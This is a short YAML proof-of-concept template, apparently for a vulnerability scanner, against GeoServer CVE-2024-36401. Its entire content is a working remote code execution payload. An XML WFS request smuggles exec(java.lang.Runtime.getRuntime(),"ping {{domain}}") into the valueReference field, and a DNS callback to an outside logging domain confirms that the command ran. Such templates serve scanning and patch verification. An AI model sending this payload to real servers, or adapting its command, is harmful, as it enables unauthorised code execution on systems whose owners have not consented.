name: poc-yaml-GeoServer-CVE-2024-36401
description: >-
  代码执行,dnslog成功回显
alwaysExecute: false
matchCount: 1
rules:
  - method: POST
    path: /geoserver/wfs
    dnslog: domain
    headers:
      Content-Type: application/xml
    body: |
        <wfs:GetPropertyValue service='WFS' version='2.0.0'
         xmlns:topp='http://www.openplans.org/topp'
         xmlns:fes='http://www.opengis.net/fes/2.0'
         xmlns:wfs='http://www.opengis.net/wfs/2.0'
         valueReference='exec(java.lang.Runtime.getRuntime(),"ping {{domain}}")'>
         <wfs:Query typeNames='topp:states'/>
        </wfs:GetPropertyValue>
    expression:
      dnslogCheck: true